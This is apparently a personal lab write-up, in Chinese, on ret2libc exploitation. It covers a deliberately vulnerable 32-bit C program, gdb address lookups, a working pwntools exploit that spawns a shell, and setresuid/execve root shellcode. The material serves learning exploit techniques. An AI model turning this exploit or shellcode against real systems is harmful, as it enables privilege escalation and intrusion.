# 0x00 beginning

记录一下学习 ret2libc[^phrack][^wooyun] 的过程, 存在在缓冲区溢出的 C 代码例子.

```c
/*
* gcc -fno-stack-protector -m32 -o level1 stack.c
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```
    
也可以下载现成的 [Target](https://github.com/zhengmin1989/ROP_STEP_BY_STEP/raw/master/linux_x86/level2), 工具依然是 peda 与 pwn 库, 验证一下安全机制的开启.

```
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
    
# 0x01 challenge

因为开启了 NX,stack 权限不一样, 本来 level1 上面的是可以执行的, 现在 x 权限拿掉了即使 rop 成功, 把 eip 放到栈上也会应为权限问题导致失败, 可以看见 level2 的 stack 是 rw,level1 的是 rwx.

```shell
Sn0rt@warzone:~/lab$ gdb level1
gdb-peda$ vmmap 
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/home/Sn0rt/lab/level1
...
0xbffdf000 0xc0000000 rwxp	[stack]

Sn0rt@warzone:~/lab$ gdb level2
gdb-peda$ vmmap 
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/home/Sn0rt/lab/level2
...
0xbffdf000 0xc0000000 rw-p	[stack]
```

# 0x02 solution

可以看见 level2 的是使用了 libc 的.

```shell
Sn0rt@warzone:~/lab$ ./level2 
gdb-peda$ vmmap 
Start      End        Perm	Name
...
0xb7e23000 0xb7fcb000 r-xp	/lib/i386-linux-gnu/libc-2.19.so
0xb7fcb000 0xb7fcd000 r--p	/lib/i386-linux-gnu/libc-2.19.so
0xb7fcd000 0xb7fce000 rw-p	/lib/i386-linux-gnu/libc-2.19.so
...
```

而已知 lib 里面含有`system`这样的函数, 也含有`/bin/sh`字符串, 构造出`system("/bin/sh")`就可以, 不过 system 的一个实现如下:

```c
int
system(const char *command)
{
  pid_t pid;
	sig_t intsave, quitsave;
	sigset_t mask, omask;
	int pstat;
	char *argp[] = {"sh", "-c", NULL, NULL};
	if (!command)		/* just checking... */
		return(1);
	argp[2] = (char *)command;
	sigemptyset(&mask);
	sigaddset(&mask, SIGCHLD);
	sigprocmask(SIG_BLOCK, &mask, &omask);
	switch (pid = vfork()) {
	case -1:			/* error */
		sigprocmask(SIG_SETMASK, &omask, NULL);
		return(-1);
	case 0:				/* child */
		sigprocmask(SIG_SETMASK, &omask, NULL);
		execve(_PATH_BSHELL, argp, environ);
    _exit(127);
}
```

可以看出构造出 sh 开头指令, 让 execve 去执行,sh 很多平台是 bash 的符号链接, 而 bash 在早期版本就修正了 sh -c suid 为 0 的安全问题.
好了, 继续我们手下的活, 找出`/bin/sh`和`system()`位置.

```shell
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
gdb-peda$ searchmem "/bin/sh" libc
Searching for '/bin/sh' in: libc ranges
Found 1 results, display max 1 items:
libc : 0xb7f83a24 ("/bin/sh")
```

好了, 基本条件都具备了, 准备 exp.

# 0x03 construction

exp 布局大约是

    140bytes 填充 + system 地址 + system 返回过后的地址 + "/bin/sh"地址
    
新的问题来了,system 返回过后的地址是什么? 我打算放的函数`exit()`地址,`exit()`是需要一个参数的. 虽然这样解决也不是很好, 但是起码不会 segment fault.

```python
#!/usr/bin/env python
from pwn import *

p = process('./level2')
ret = 0xb7e561e0
systemaddr = 0xb7e63190
binshaddr = 0xb7f83a24
payload = 'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
p.send(payload)
p.interactive()
```

```shell
Sn0rt@warzone:~/lab$ python exp_level2.py 
[+] Starting program './level2': Done
[*] Switching to interactive mode
$ id
uid=1042(Sn0rt) gid=1043(Sn0rt) groups=1043(Sn0rt)
```

# 0x04 others

对 suid 程序攻击套路,`setuid(0)`然后`execve("/bin//sh", ["/bin//sh", NULL], [NULL])` 或 `system("/bin/sh")`,shellcode 应该是下面这样子, 不过因为权限问题. 但是这些样功能可以通过`libc`里面以及有点代码构造出来, 而且那些代码没有执行权限的问题.

```x86asm
BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; zero out eax
  xor ebx, ebx      ; zero out ebx
  xor ecx, ecx      ; zero out ecx
  cdq               ; zero out edx using the sign bit from eax
  mov BYTE al, 0xa4 ; syscall 164 (0xa4)
  int 0x80          ; setresuid(0, 0, 0)  restore all root privs

; execve(const char *filename, char *const argv [], char *const envp[])
  push BYTE 11      ; push 11 to the stack
  pop eax           ; pop dword of 11 into eax
  push ecx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push ecx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```

### reference

[^wooyun]: [wooyun drops](http://drops.wooyun.org/tips/6597)
[^phrack]: [Nergal Advanced return-to-libc exploit(s) Phrack 49, Volume 0xb, Issue 0x3a](http://phrack.org/issues/58/4.html)
